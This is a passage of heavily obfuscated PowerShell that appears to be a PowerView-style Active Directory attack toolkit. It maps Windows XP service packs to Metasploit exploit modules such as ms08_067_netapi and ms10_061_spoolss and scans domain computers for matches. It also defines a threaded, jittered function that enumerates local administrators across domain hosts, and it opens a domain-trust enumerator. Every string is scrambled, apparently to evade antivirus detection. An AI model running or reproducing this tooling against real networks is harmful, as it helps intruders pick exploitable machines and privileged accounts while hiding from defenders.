    ${n`ULL} = ${tA`Blee`Xp`LoI`TS}."Ro`ws".("{1}{0}" -f'd','Ad')."in`Vo`KE"(("{2}{1}{0}" -f("{1}{2}{0}"-f 'P','n','dows X'),'i','W'),("{1}{2}{0}{4}{3}"-f'i','S','erv',' 2',("{0}{2}{1}"-f'ce P','ck','a')),("{1}{5}{6}{3}{4}{0}{2}{7}" -f 'ms0','ex',("{0}{2}{1}" -f'6_','etap','040_n'),("{1}{2}{0}" -f'b','dows/','sm'),'/',("{1}{0}" -f 'oit/w','pl'),'in','i'),("{4}{5}{2}{0}{3}{1}{6}{9}{8}{7}{10}"-f ("{1}{0}" -f 'ils','ta'),'c','de',("{0}{1}"-f'.co','m/'),("{0}{2}{3}{1}"-f'h','://www.c','t','tp'),'ve',("{0}{1}" -f've/','2'),("{0}{1}" -f'-','343'),'06','0','9'))  
    ${Nu`lL} = ${Ta`BLE`E`XpLoiTs}."r`ows".("{1}{0}"-f 'd','Ad')."i`NvoKe"(("{1}{0}{2}"-f'nd','Wi',("{1}{0}" -f'P','ows X')),("{0}{3}{1}{4}{2}" -f ("{2}{0}{1}"-f'e',' Pa','Servic'),'k','2','c',' '),("{5}{3}{0}{1}{4}{6}{7}{9}{2}{8}" -f 'lo',("{1}{0}{2}" -f '/','it','windo'),("{1}{2}{0}"-f '6_06','ms','0'),'p','ws/','ex','sm','b',("{1}{0}" -f'wapi','6_n'),'/'),("{7}{1}{4}{5}{9}{6}{3}{8}{0}{10}{2}"-f("{1}{0}" -f'e/','/cv'),("{1}{0}{2}"-f'/','/','www.c'),("{1}{2}{0}" -f'-4688','0','6'),'i','v','ede','a',("{0}{1}" -f'htt','p:'),("{0}{1}" -f 'l','s.com'),'t','20'))  
    ${n`ULL} = ${T`A`B`LEeXPLoITS}."Ro`Ws".("{1}{0}"-f 'dd','A')."in`VOkE"(("{2}{0}{1}"-f'ws ','XP',("{1}{0}"-f'o','Wind')),("{2}{0}{1}"-f 'vi',("{0}{1}" -f 'ce',' Pack 2'),'Ser'),("{8}{0}{6}{2}{10}{7}{4}{9}{5}{1}{3}" -f 'x','wks','l','svc',("{3}{2}{1}{0}"-f's06_0','/m','smb','s/'),'_','p',("{0}{1}" -f'i','ndow'),'e','70',("{0}{1}" -f 'oi','t/w')),("{2}{10}{4}{5}{3}{1}{6}{8}{7}{0}{11}{9}"-f'-46',("{0}{1}" -f'w','ww.c'),'ht','/','p',':/',("{2}{1}{0}"-f'ails','det','ve'),("{0}{2}{1}" -f 'c','6','om/cve/200'),'.','1','t','9'))  
    ${N`UlL} = ${t`A`Bl`eeXPLo`ITS}."r`Ows".("{1}{0}"-f 'd','Ad')."In`VOke"(("{2}{0}{1}" -f("{0}{1}" -f'do','ws'),' XP','Win'),("{2}{3}{4}{0}{1}" -f 'ck',' 2','Ser','v',("{1}{2}{0}"-f 'Pa','i','ce ')),("{6}{8}{1}{5}{0}{4}{3}{7}{2}" -f 'o',("{0}{1}"-f't/w','in'),'api','s','ws/','d','exp',("{0}{1}{3}{2}"-f 'mb/ms','08','net','_067_'),'loi'),("{3}{6}{4}{1}{2}{0}{5}" -f ("{0}{1}"-f'tails','.c'),("{1}{0}"-f 'ed','.cv'),'e',("{2}{0}{1}" -f':','/','http'),'ww',("{2}{3}{1}{0}{4}" -f '8-','200','om/cv','e/','4250'),'/w'))  
    ${NU`lL} = ${TABL`eexplo`its}."R`Ows".("{1}{0}"-f'dd','A')."i`NvO`ke"(("{1}{2}{0}"-f 'XP','Win',("{1}{0}"-f'ws ','do')),("{0}{3}{2}{1}" -f("{0}{1}"-f 'Ser','vi'),("{1}{0}"-f 'ack 2','P'),' ','ce'),("{7}{8}{3}{4}{0}{9}{6}{10}{2}{1}{5}"-f 'do',("{0}{1}" -f'1_spo','ol'),("{1}{0}"-f'_06','0'),'/w','in','ss',("{1}{0}" -f'm','s/s'),'e',("{0}{1}{2}" -f 'x','plo','it'),'w',("{1}{0}" -f '/ms1','b')),("{4}{9}{10}{0}{7}{2}{6}{3}{11}{1}{5}{8}"-f 've',("{3}{2}{1}{0}"-f '10-2','20','/','com/cve'),'tai','s','h','72','l','de','9',("{1}{2}{0}" -f'p://ww','t','t'),'w.c','.'))  
    ${n`Ull} = ${TA`B`leEXpLOIts}."R`OWs".("{0}{1}" -f'A','dd')."iN`V`OKE"(("{2}{1}{3}{0}"-f' XP','ndo','Wi','ws'),("{0}{1}{2}"-f ("{0}{1}" -f 'Se','rvi'),("{0}{2}{1}" -f 'c','ac','e P'),'k 3'),("{3}{5}{0}{1}{6}{4}{2}" -f("{2}{1}{0}" -f 'b','/sm','dows'),'/',("{3}{1}{0}{2}"-f 'e','067_n','tapi','8_'),("{0}{1}"-f 'exp','loi'),'0',("{1}{0}"-f 'in','t/w'),'ms'),("{5}{0}{4}{3}{6}{2}{1}" -f ("{3}{2}{0}{1}"-f'.','cved','ww','/w'),("{0}{1}"-f '8-4','250'),("{0}{1}"-f 've/20','0'),("{1}{0}" -f'm','.co'),("{1}{0}"-f 'tails','e'),("{1}{0}{2}"-f'tp:','ht','/'),'/c'))  
    ${n`ULL} = ${TaB`Leex`PL`OiTs}."Ro`Ws".("{0}{1}"-f'A','dd')."IN`VokE"(("{0}{1}{2}{3}"-f'Wi','nd','ows',' XP'),("{0}{1}{2}"-f 'S',("{1}{0}{2}"-f'rvic','e','e P'),("{1}{0}"-f'k 3','ac')),("{3}{5}{8}{9}{0}{6}{7}{1}{2}{4}"-f ("{0}{1}"-f'nd','ows'),("{0}{1}" -f'poo','l'),'s','ex','s','plo',("{1}{0}{2}" -f's','/smb/m','10_06'),'1_s','i',("{1}{0}"-f 'wi','t/')),("{0}{5}{1}{9}{4}{8}{6}{2}{3}{7}{10}"-f'ht',("{0}{1}" -f'w.c','v'),("{2}{0}{1}"-f'ls.c','o','ai'),'m/','d',("{1}{0}" -f'://ww','tp'),'t',("{0}{1}{2}" -f 'cve','/2','0'),'e','e',("{2}{1}{0}"-f '29','0-27','1')))  
    ${n`ULL} = ${Ta`Ble`eXplOITS}."r`OWs".("{0}{1}" -f'Ad','d')."iNV`oKE"(("{1}{0}{3}{2}"-f'i','W',("{2}{0}{1}" -f's X','P','dow'),'n'),"",("{8}{2}{1}{5}{9}{6}{0}{4}{3}{7}" -f ("{1}{0}"-f 'rpc/','e'),'t/','loi','6_d',("{2}{0}{1}"-f's0','3_02','m'),'w',("{0}{1}"-f'ws/','dc'),'com','exp',("{1}{0}"-f'ndo','i')),("{6}{8}{4}{2}{7}{9}{0}{1}{5}{10}{3}"-f '/cv',("{0}{1}" -f 'e','/200'),'v','/','.c',("{1}{0}" -f'03','3-'),("{2}{0}{1}" -f'p','://ww','htt'),("{0}{1}"-f 'edetail','s.'),'w','com','52'))  
    ${n`ULL} = ${t`AblEExp`LOITS}."rO`Ws".("{1}{0}" -f'd','Ad')."i`NVoKE"(("{1}{2}{0}" -f' XP',("{0}{1}" -f 'Wind','o'),'ws'),"",("{3}{4}{0}{7}{5}{1}{6}{2}" -f'oi','dc','smq','exp','l','/',("{3}{4}{2}{0}{1}" -f'_','017_m','ms05','er','pc/'),("{2}{0}{1}" -f '/wind','ows','t')),("{5}{1}{6}{3}{4}{2}{0}{7}" -f ("{0}{2}{1}" -f'/2','05-005','0'),'ww.',("{1}{0}"-f 've','/c'),("{0}{1}" -f'tai','ls'),("{0}{1}" -f'.co','m'),("{0}{2}{1}" -f'http:','/w','/'),("{0}{1}"-f'cv','ede'),'9'))  
    ${N`ULL} = ${tAB`L`ee`xPLOi`Ts}."r`OwS".("{0}{1}"-f'A','dd')."iN`V`okE"(("{1}{2}{0}"-f ("{0}{1}"-f'w','s XP'),'Win','do'),"",("{4}{2}{5}{1}{0}{3}"-f ("{2}{1}{3}{0}"-f '0_n','_','/ms06','04'),("{1}{0}" -f 'mb','s/s'),'ind',("{1}{0}" -f 'tapi','e'),("{2}{0}{1}" -f'ploit/','w','ex'),'ow'),("{4}{2}{9}{7}{3}{6}{8}{1}{5}{0}" -f'9',("{0}{1}"-f'0','06-'),("{0}{1}" -f'w.','cv'),("{3}{1}{2}{0}" -f 'com/cv','ls','.','i'),("{2}{1}{3}{0}"-f 'ww',':/','http','/'),'343','e','eta','/2','ed'))  
    ${n`ULl} = ${t`ABlE`e`xPlo`its}."RO`Ws".("{0}{1}" -f 'A','dd')."i`NVO`Ke"(("{0}{2}{1}{3}" -f'Wi','dow','n',("{0}{1}" -f's ','XP')),"",("{2}{6}{10}{0}{9}{8}{4}{3}{7}{1}{5}" -f '/ms','t',("{2}{0}{3}{1}" -f'wi','/','exploit/','ndows'),("{1}{0}" -f'_n','067'),'_','api','sm','e','8','0','b'),("{1}{8}{6}{4}{5}{3}{2}{0}{7}"-f 'o',("{0}{1}" -f'htt','p'),'c','ls.',("{1}{0}{2}"-f'e','w.cv','det'),'ai','/ww',("{1}{0}{3}{2}" -f'/cve','m','250','/2008-4'),':/'))  

    
    &("{2}{1}{0}"-f("{0}{1}"-f 'rb','ose'),'e',("{0}{1}{2}" -f'W','r','ite-V')) ("{9}{6}{2}{0}{15}{3}{11}{8}{12}{13}{5}{7}{1}{10}{4}{14}" -f'ng ',' le','i','e','ls',("{0}{2}{1}"-f'rabl','OS ','e '),'ck',("{0}{2}{1}" -f'a','SP','nd '),'s',("{1}{0}"-f ' Che','[*]'),'ve','r',' fo',("{1}{2}{0}"-f 'vulne','r',' '),'...',("{0}{1}"-f 'com','put'))

    
    
    

    
    ${ta`BLeV`UlNCOmp`U`TeRs} = &("{2}{0}{1}" -f 'w-O',("{0}{1}" -f'b','ject'),'Ne') ("{3}{2}{5}{4}{6}{1}{0}" -f ("{0}{1}"-f't','aTable'),'.Da','y','S',("{2}{0}{1}" -f'm.','Dat','e'),'st','a') 
    ${nU`ll} = ${tA`Ble`VuL`NComPUt`ers}."C`OL`UmNS".("{0}{1}"-f 'A','dd')."INv`OKE"(("{0}{3}{2}{1}" -f 'C',("{1}{2}{0}"-f'erName','u','t'),'p','om'))
    ${N`UlL} = ${TABLe`VuLN`ComP`Ut`e`RS}."C`OlUm`Ns".("{0}{1}" -f 'Ad','d')."IN`VO`Ke"(("{2}{1}{0}" -f'tem','Sys',("{3}{2}{0}{1}"-f'at','ing','r','Ope')))
    ${nu`lL} = ${TA`Bl`EVuln`C`OMPUTe`Rs}."COLUM`Ns".("{1}{0}" -f'd','Ad')."iN`VOkE"(("{0}{2}{1}" -f("{0}{1}" -f 'Ser','vi'),'ck',("{1}{0}" -f 'a','ceP')))
    ${n`ULL} = ${TAbl`evUl`NCOMp`UT`e`RS}."Co`lU`MNS".("{1}{0}"-f 'dd','A')."in`VoKe"(("{0}{1}{2}" -f'Las','t',("{1}{0}"-f'n','Logo')))
    ${nu`Ll} = ${TaB`leV`UL`NcOMPuters}."c`OLUMNs".("{0}{1}" -f 'A','dd')."iNV`O`ke"(("{1}{0}{2}" -f'ul',("{1}{0}"-f 'od','MsfM'),'e'))
    ${Nu`Ll} = ${tAB`LEV`UL`N`cOmpuTErs}."col`UM`Ns".("{0}{1}" -f'Ad','d')."IN`VoKE"('CVE')

    
    ${tA`Blee`XpL`Oits} | &("{0}{1}{3}{2}" -f 'Fo',("{1}{0}"-f 'ac','rE'),'ct',("{1}{0}"-f'Obje','h-')) {
                 
        ${eXP`loit`Os} = ${_}."o`PeRATiN`gs`yst`Em"
        ${EXpl`oi`Tsp} = ${_}."Se`RVi`c`EpAck"
        ${EX`PLOIT`MSf} = ${_}."M`sFm`OdUlE"
        ${EXP`LoIt`cVe} = ${_}."C`Ve"

        
        ${TA`BLeAD`Scompu`TeRs} | &("{1}{0}{2}{3}{4}"-f("{0}{1}" -f'orE','ach'),'F','-','Obj','ect') {
            
            ${ad`ShOsTna`ME} = ${_}."Hos`T`NAmE"
            ${ad`s`OS} = ${_}."opeR`AtingsY`s`T`em"
            ${A`dsSp} = ${_}."Ser`VIce`P`ACK"                                                        
            ${ads`LasT} = ${_}."l`A`StLogon"
            
            
            if (${Ad`S`oS} -like "$ExploitOS*" -and ${ADs`sp} -like "$ExploitSP" ) {                    
                
                ${n`UlL} = ${TaBLE`VUlNcoMp`U`TErS}."r`oWs".("{1}{0}"-f 'dd','A')."INV`O`KE"(${AD`SHo`StnA`mE},${ad`S`Os},${ad`sSP},${a`DSLaSt},${eXP`L`o`ItMsF},${EX`PlOI`Tc`VE})
            }
        }
    }     
    
    
    ${Vu`lNcOM`pu`Ter} = ${TabLEvuL`N`cOmp`Ut`Ers} | &("{2}{3}{1}{0}" -f 'ect','bj','Se',("{1}{0}{2}"-f'ec','l','t-O')) ("{1}{2}{0}"-f ("{0}{1}{2}"-f'te','rNa','me'),'Com','pu') -Unique | &("{0}{3}{1}{2}"-f'Me',("{1}{0}" -f'Obje','-'),'ct',("{1}{0}" -f'ure','as'))
    ${vU`lNCOmP`UTERcOu`Nt} = ${vUL`Nc`omp`UT`eR}."cO`UnT"
    if (${VUL`NCoM`PU`TER}."C`Ount" -gt 0) {
        
        &("{0}{1}{2}"-f("{0}{1}"-f'Wri','t'),("{0}{1}" -f'e-Ve','r'),("{0}{1}" -f'bos','e')) ('['+'+] '+'F'+("{0}{1}"-f 'oun','d')+' '+("$VulnComputerCount "+'')+'po'+("{0}{2}{1}" -f 'te','ial','nt')+'l'+'y '+'vul'+'ner'+("{0}{1}" -f'a','ble ')+'sy'+("{0}{1}"-f'st','em')+'s!')
        ${TA`BlevUlnc`OMPu`Te`RS} | &("{2}{1}{3}{0}"-f 't','rt','So',("{2}{0}{1}"-f'bj','ec','-O')) { ${_}."L`ASTl`ogon" -as [datetime]} -Descending
    }
    else {
        &("{0}{1}{2}"-f ("{0}{2}{1}"-f 'Wr','te-','i'),("{0}{1}" -f'V','erb'),'ose') ("{5}{4}{0}{1}{6}{7}{8}{3}{2}" -f'o',' v',("{1}{0}{2}" -f 'e found','r','.'),("{0}{1}"-f 's',' we'),' N','[-]',("{2}{1}{0}"-f 'erable ','n','ul'),("{1}{0}" -f'st','sy'),'em')
    }
}


function in`V`oKe-E`NuMERa`T`elOc`AlaD`M`In {


    [CmdletBinding()]
    param(
        [Parameter(POsItioN=0,vALuefrOmpipeLINe=${tR`UE})]
        [Alias({"{0}{1}"-f ("{1}{0}"-f'ost','H'),'s'})]
        [String[]]
        ${compu`T`eRn`AME},

        [ValidateScript({&("{1}{0}" -f ("{0}{1}" -f 'P','ath'),("{0}{1}" -f 'Test','-')) -Path ${_} })]
        [Alias({"{0}{1}{2}"-f("{0}{1}" -f'H','ost'),'Lis','t'})]
        [String]
        ${COM`PUTE`R`FIlE},

        [String]
        ${C`OM`puTErFI`LtEr},

        [String]
        ${CoMpu`TerA`dS`patH},

        [Switch]
        ${N`oPInG},

        [UInt32]
        ${d`E`lAy} = 0,

        [Double]
        ${j`it`TER} = .3,

        [String]
        ${o`UtfIle},

        [Switch]
        ${noCL`ob`BEr},

        [Switch]
        ${t`Ru`sTgROUPS},

        [String]
        ${DO`ma`iN},

        [String]
        ${dOm`A`i`Nc`oNtRo`LLer},

        [Switch]
        ${s`eA`R`chfor`est},

        [ValidateRange(1,100)] 
        [Int]
        ${Th`R`eaDS}
    )

    begin {
        if (${p`SbO`U`NDPAramEtE`RS}[("{0}{1}"-f'D',("{1}{0}" -f'bug','e'))]) {
            ${DEBuGp`ReF`eRen`cE} = ("{0}{2}{1}" -f 'C','e',("{0}{1}" -f'onti','nu'))
        }

        
        ${Ra`N`dnO} = &("{0}{3}{1}{2}"-f("{0}{1}" -f 'New','-'),'j','ect','Ob') ("{1}{2}{0}{3}"-f ("{0}{1}{2}" -f'.','R','ando'),'Sys','tem','m')

        &("{2}{0}{1}{3}" -f ("{0}{2}{1}" -f 'it','b','e-Ver'),'o','Wr','se') ('['+'*] '+'Run'+'nin'+'g '+("{1}{0}"-f 'e-','Invok')+("{0}{1}{2}"-f 'E','nu','mer')+'a'+("{2}{0}{1}" -f'alAd','m','teLoc')+'i'+'n '+'wit'+'h '+'d'+("{1}{0}"-f 'y ','ela')+'o'+'f '+"$Delay")

        
        if(${COMpU`TeRF`Ile}) {
            ${COM`puTEr`N`A`me} = &("{0}{2}{1}{3}" -f 'Ge','te',("{1}{0}" -f 'n','t-Co'),'nt') -Path ${C`Om`pUterFile}
        }

        if(!${coMP`UtE`Rn`AMe}) { 
            [array]${cOmPUtE`R`NA`ME} = @()

            if(${Do`mAIN}) {
                ${TA`RGet`D`Oma`ins} = @(${D`omA`IN})
            }
            elseif(${s`EArc`h`FOre`St}) {
                
                ${TARG`et`do`m`AINs} = &("{5}{2}{1}{3}{0}{4}"-f'ai',("{1}{0}" -f 'stD','re'),("{0}{1}" -f 't-Ne','tFo'),'om','n','Ge') | &("{3}{2}{1}{0}" -f 'ect',("{0}{1}"-f'-','Obj'),("{0}{1}{2}" -f'or','Eac','h'),'F') { ${_}."n`AMe" }
            }
            else {
                
                ${t`ArGe`T`do`MainS} = @( (&("{3}{2}{0}{1}"-f'oma','in',("{0}{1}" -f'et-N','etD'),'G'))."n`AmE" )
            }

            ForEach (${D`OmaIN} in ${tA`R`gET`dOMAInS}) {
                &("{2}{0}{1}" -f("{1}{0}" -f'-','ite'),("{2}{1}{0}" -f 'e','os','Verb'),'Wr') ('[*]'+' '+'Q'+("{0}{1}" -f 'u','eryi')+'ng '+'dom'+'a'+'in '+("$Domain "+'')+'for'+' '+'h'+("{0}{1}"-f'os','ts'))
                ${cOm`P`UTern`AmE} += &("{0}{1}{2}{3}"-f ("{1}{0}"-f 't-','Ge'),'Ne',("{1}{2}{0}" -f 't','t','Compu'),'er') -Filter ${CoMputer`F`i`lTEr} -ADSpath ${co`mpUtER`A`DspA`TH} -Domain ${DoM`A`iN} -DomainController ${dOm`AIn`CoN`TROlLeR}
            }
            
            
            ${co`M`puTeR`Name} = ${coM`pU`T`e`RNamE} | &("{3}{2}{0}{1}" -f '-Ob',("{1}{0}" -f 'ct','je'),'ere','Wh') { ${_} } | &("{0}{1}{2}"-f("{0}{2}{1}"-f'S','O','ort-'),'b',("{0}{1}"-f 'je','ct')) -Unique | &("{2}{1}{0}" -f ("{0}{1}" -f'b','ject'),'O',("{1}{0}" -f'rt-','So')) { &("{0}{2}{1}"-f ("{0}{1}" -f'Ge','t-Ra'),'dom','n') }
            if($(${Com`PuT`e`RNAMe}."CO`UNt") -eq 0) {
                throw ("{2}{4}{0}{3}{1}" -f'un','!',("{1}{2}{0}" -f's ','No h','ost'),'d','fo')
            }
        }

        
        if(!${no`cLO`BB`ER}) {
            if (${o`UtfiLE} -and (&("{2}{1}{0}" -f("{0}{1}" -f'P','ath'),'st-','Te') -Path ${O`UtFI`le})) { &("{0}{1}{3}{2}" -f("{0}{1}" -f'R','emo'),("{0}{1}"-f 've','-I'),'em','t') -Path ${oUt`FIlE} }
        }

        if(${tr`USTGR`oU`Ps}) {
            
            &("{2}{1}{3}{0}{4}"-f 'b',("{0}{1}"-f 'ite','-V'),'Wr','er','ose') ("{0}{1}{3}{2}{4}{5}" -f("{2}{3}{1}{4}{0}" -f' domain','ni','D','etermi','ng'),("{0}{1}"-f' ','trus'),' ','t','g',("{0}{1}" -f'roup','s'))

            
            ${Tru`stgRo`UpN`AMES} = &("{4}{1}{3}{2}{5}{0}"-f 'p',("{0}{1}" -f '-F','or'),'g','ei',("{1}{0}" -f'ind','F'),("{1}{0}" -f'u','nGro')) -Domain ${dO`mA`iN} -DomainController ${d`oM`AIN`cO`NtroLL`eR} | &("{0}{3}{1}{2}" -f'For',("{0}{1}" -f '-Ob','j'),'ect',("{1}{0}"-f'ch','Ea')) { ${_}."GR`OUPNa`me" } | &("{1}{2}{0}"-f 'ct',("{1}{0}"-f 'ort-O','S'),'bje') -Unique

            ${T`Ru`stG`Rou`pSSIdS} = ${TRu`stg`RoUPN`Ames} | &("{2}{3}{1}{0}" -f ("{0}{1}"-f'j','ect'),("{1}{0}" -f 'b','ach-O'),'F','orE') { 
                
                
                &("{3}{0}{2}{1}" -f 't','p',("{1}{0}"-f'u','Gro'),("{0}{1}"-f 'Get','-Ne')) -Domain ${d`OM`AIn} -DomainController ${D`oM`AINCO`NtR`oLL`eR} -GroupName ${_} -FullData | &("{0}{3}{1}{2}" -f("{1}{0}"-f 'ere-','Wh'),'ec','t','Obj') { ${_}."oB`je`CTSId" -notmatch ("{1}{2}{3}{0}"-f'44','S-1',("{1}{0}"-f '5-3','-'),'2-5') } | &("{1}{0}{2}{3}{4}" -f 'rEa','Fo','ch-','Obj','ect') { ${_}."oBj`E`CtsID" }
            }

            
            ${domai`NS`id} = &("{1}{3}{0}{2}" -f'D','Get',("{0}{1}" -f 'omainSI','D'),'-') -Domain ${doM`AIn}
        }

        
        ${hOST`e`NUmblo`CK} = {
            param(${coMP`U`TerNaMe}, ${p`ing}, ${Out`F`ile}, ${DO`m`A`iNSId}, ${trUs`T`gr`ouPS`SIDs})

            
            ${u`P} = ${t`RUe}
            if(${p`iNg}) {
                ${U`p} = &("{2}{3}{0}{1}" -f("{1}{0}"-f 'ct','ne'),'ion','T',("{0}{1}{2}"-f'est','-','Con')) -Count 1 -Quiet -ComputerName ${cOM`PU`TeRName}
            }
            if(${u`p}) {
                
                ${lo`cAlAdM`ins} = &("{5}{2}{4}{0}{3}{1}"-f'oca',("{0}{1}" -f'rou','p'),'t-','lG',("{0}{1}"-f 'Net','L'),'Ge') -ComputerName ${coM`pu`Tername}

                
                if(${DOM`AIN`sID} -and ${TrusTg`Rou`ps`iDS}) {
                    
                    ${LOC`Als`iD} = (${lO`cAla`DmInS} | &("{1}{3}{2}{0}" -f't',("{0}{1}{2}" -f'Wh','e','re-'),'c',("{1}{0}" -f 'bje','O')) { ${_}."s`id" -match ((("{0}{1}" -f'.*-5','0')+'0'+'TuH')."R`eP`LaCe"('TuH',[StriNG][ChAr]36)) })."s`id" -replace "-500$"

                    
                    
                    ${lOcALAdM`I`NS} = ${Loca`La`DMIns} | &("{2}{1}{0}"-f 'ct',("{1}{0}"-f 're-Obje','e'),'Wh') { (${t`RUST`GROu`Pssids} -contains ${_}."S`ID") -or ((-not ${_}."s`Id".("{2}{1}{0}" -f'th','i',("{1}{0}" -f 'artsW','st'))."In`VOKe"(${L`OCAl`sId})) -and (-not ${_}."S`Id".("{2}{0}{1}" -f 'ta',("{1}{0}{2}" -f 'tsW','r','ith'),'s')."inv`O`KE"(${dOMa`iNS`id}))) }
                }

                if(${L`OcalAd`MiNs} -and (${L`OcAl`Ad`mIns}."LEN`gth" -ne 0)) {
                    
                    if(${OU`T`FILe}) {
                        ${l`ocala`DmI`Ns} | &("{1}{2}{0}{3}" -f'CS',("{1}{0}{2}" -f 'rt-','Expo','Po'),("{1}{0}" -f'ew','werVi'),'V') -OutFile ${OuT`Fi`lE}
                    }
                    else {
                        
                        ${LOcaL`A`DmI`Ns}
                    }
                }
                else {
                    &("{2}{0}{1}{4}{3}" -f ("{1}{0}" -f'e-','it'),'Ver','Wr','se','bo') ('[!]'+' '+'No'+' '+("{1}{0}" -f'sers','u')+' '+'r'+("{1}{0}{2}"-f'd','eturne',' ')+'fr'+'om '+"$Server")
                }
            }
        }

    }

    process {

        if(${T`HRE`AdS}) {
            &("{2}{3}{1}{0}"-f 'e','os',("{0}{1}" -f'Wr','it'),("{1}{0}" -f'erb','e-V')) ('Usi'+'ng '+("{1}{0}"-f 'rea','th')+'din'+'g '+'wi'+'th '+("{1}{0}"-f 'e','thr')+'a'+'ds '+'= '+"$Threads")

            
            ${s`CrIP`Tp`A`Rams} = @{
                ("{1}{0}"-f 'ng','Pi') = $(-not ${NOpi`Ng})
                ("{0}{1}" -f ("{0}{1}"-f 'OutFi','l'),'e') = ${o`UtfILe}
                ("{2}{0}{1}" -f("{1}{0}" -f 'main','o'),'SID','D') = ${d`OMA`i`NSiD}
                ("{3}{0}{1}{2}{4}"-f("{0}{1}" -f'ru','st'),("{0}{2}{1}"-f 'Gr','upsSI','o'),'D','T','s') = ${tr`UstG`Rou`pSSIdS}
            }

            
            &("{2}{5}{1}{0}{3}{4}"-f("{0}{1}" -f 'aded','F'),("{0}{1}"-f'Thr','e'),("{0}{1}"-f 'In','vo'),("{1}{0}" -f 'cti','un'),'on','ke-') -ComputerName ${CO`MP`UtErNAme} -ScriptBlock ${HOStENU`mB`l`OCK} -ScriptParameters ${s`cR`IpTpARAmS}
        }

        else {
            if(-not ${n`opinG} -and (${C`omp`UteRNA`Me}."cO`UNt" -ne 1)) {
                
                ${p`InG} = {param(${CO`MPU`TE`RNamE}) if(&("{2}{0}{1}{4}{3}"-f't-C','onn','Tes',("{0}{1}"-f 'cti','on'),'e') -ComputerName ${cOMpu`T`ER`NAme} -Count 1 -Quiet -ErrorAction ("{1}{0}" -f'p','Sto')){${CoM`P`UTE`RnamE}}}
                ${coMpUt`er`NAme} = &("{5}{4}{0}{2}{1}{3}"-f ("{2}{1}{0}"-f'ead','Thr','-'),'un','edF',("{0}{1}"-f 'cti','on'),'oke','Inv') -NoImports -ComputerName ${CoMp`UTE`RnA`Me} -ScriptBlock ${pI`NG} -Threads 100
            }

            &("{1}{3}{0}{2}" -f("{1}{0}"-f 'bos','Ver'),'W','e',("{0}{1}"-f'rit','e-')) "[*] Total number of active hosts: $($ComputerName.count)  "
            ${cOuN`TEr} = 0

            ForEach (${COMpUt`er} in ${coM`P`UTe`RnAME}) {

                ${c`OuntER} = ${cOunT`eR} + 1

                
                &("{1}{0}{2}" -f 'le',("{0}{2}{1}"-f 'S','-S','tart'),'ep') -Seconds ${Ra`NdNo}.("{1}{0}" -f't','Nex')."IN`V`Oke"((1-${JIt`T`Er})*${d`elAy}, (1+${JI`TT`er})*${deL`AY})

                &("{0}{1}{2}{3}" -f 'Wr',("{0}{1}" -f 'ite','-'),("{0}{1}"-f'Ve','rbo'),'se') "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))  "
                &("{3}{0}{2}{4}{1}"-f 'oke','d','-C','Inv',("{1}{0}" -f'an','omm')) -ScriptBlock ${h`OS`TE`NuMBlO`ck} -ArgumentList ${c`Om`PUteR}, ${FA`l`se}, ${O`Ut`FiLE}, ${dOm`A`InsiD}, ${trust`GRo`UpS`SiDS}
            }
        }
    }
}








function GET-n`e`T`D`omAIn`T`RuSt {


    [CmdletBinding()]
    param(
        [Parameter(PoSitIOn=0,vALUefrOMPipeline=${T`Rue})]
        [String]
        ${doMa`iN} = (&("{0}{4}{1}{2}{3}"-f ("{0}{1}"-f'G','et-'),'t','D',("{0}{1}"-f 'omai','n'),'Ne'))."N`AmE",

        [String]
        ${d`oM`A`i`NConTroLleR},

        [Switch]
        ${L`DAp},

        [ValidateRange(1,10000)] 
        [Int]
        ${P`A`g`esIZE} = 200
    )

    process {
        if(${l`dAp} -or ${DO`Ma`inc`o`N`TRolleR}) {

            ${TR`U`STSeaR`CHeR} = &("{0}{2}{1}{3}" -f ("{1}{0}"-f't-','Ge'),("{0}{1}{2}"-f'mai','nSea','r'),'Do',("{0}{1}"-f'ch','er')) -Domain ${DOmA`In} -DomainController ${doMAIn`cOn`T`R`OlLer} -PageSize ${Pag`eS`iZe}

            if(${Tru`ST`s`eA`Rcher}) {

                ${tRU`sTsEarc`H`er}."fi`l`TER" = ((("{7}{1}{2}{6}{0}{4}{5}{3}"-f 'r',("{0}{1}" -f 'jectC','l'),'ass','n))',("{2}{0}{1}"-f 'D','oma','usted'),'i','=t',((("{1}{0}" -f '(ob','(&'))))))

                ${tRUS`T`SEa`Rch`eR}.("{1}{0}" -f 'All',("{1}{0}" -f 'ind','F'))."i`NvO`KE"() | &("{1}{2}{0}"-f("{0}{1}" -f'jec','t'),'W',("{1}{2}{0}" -f 'e-Ob','he','r')) {${_}} | &("{4}{2}{0}{3}{1}"-f'Ob','ct',("{2}{1}{0}" -f'ch-','Ea','r'),'je','Fo') {
                    ${pr`oPS} = ${_}."prO`p`erTieS"
                    ${dO`ma`Int`RusT} = &("{0}{1}{2}"-f'Ne',("{1}{0}"-f '-Ob','w'),("{0}{1}"-f'je','ct')) ("{0}{1}{2}"-f'P','SOb',("{1}{0}"-f 'ct','je'))
                    ${TrUST`A`TtRiB} = Switch (${p`Rops}."T`RUSt`AtT`RIButEs")
                    {
                        0x001 { ("{2}{3}{0}{1}"-f ("{1}{0}" -f 'nsitiv','a'),'e',("{1}{0}"-f '_t','non'),'r') }
                        0x002 { ("{2}{3}{1}{0}" -f 'y',("{0}{1}"-f'_','onl'),'upl',("{0}{1}"-f'e','vel')) }
                        0x004 { ("{4}{2}{0}{1}{3}" -f("{0}{1}"-f'_do','m'),'ai',("{0}{1}{2}" -f 'ra','nti','ned'),'n','qua') }
                        0x008 { ("{2}{4}{3}{0}{1}" -f("{1}{0}" -f'_tr','t'),("{1}{0}" -f 'ive','ansit'),'fo','s','re') }
                        0x010 { ("{5}{2}{1}{0}{4}{3}"-f 'iz',("{1}{0}" -f'n','_orga'),("{1}{0}" -f 'oss','r'),'n',("{0}{1}"-f 'at','io'),'c') }
                        0x020 { ("{2}{0}{1}" -f ("{0}{1}"-f 'fo','res'),'t',("{0}{1}"-f'withi','n_')) }
                        0x040 { ("{0}{1}{2}{3}" -f ("{0}{1}" -f 'tre','a'),("{0}{1}"-f't_as','_'),("{1}{0}"-f'e','ext'),("{0}{1}"-f 'rna','l')) }
                        0x080 { ("{0}{1}{3}{2}{4}" -f ("{3}{1}{0}{2}" -f'es_rc4','ust_us','_en','tr'),'cry','io','pt','n') }
                        0x100 { ("{0}{3}{4}{2}{1}" -f("{2}{0}{1}" -f '_u','s','trust'),'ys','_ke',("{1}{0}"-f'a','es_'),'es') }
                        ("{0}{1}"-f ("{1}{0}" -f 'aul','Def'),'t') { 
